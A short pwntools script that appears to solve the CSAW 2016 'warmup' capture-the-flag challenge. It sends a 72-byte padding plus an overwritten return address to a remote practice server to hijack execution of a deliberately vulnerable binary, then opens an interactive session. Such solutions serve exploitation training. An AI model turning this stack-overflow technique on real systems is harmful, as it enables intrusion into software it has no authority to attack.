#coding:utf-8
from pwn import *
sh = process("./warmup_csaw_2016")
# elf = ELF("./warmup_csaw_2016")
sh = remote("node3.buuoj.cn",27197)
payload = 'a'*72
payload += p64(0x40060D)
sh.sendline(payload)
sh.interactive()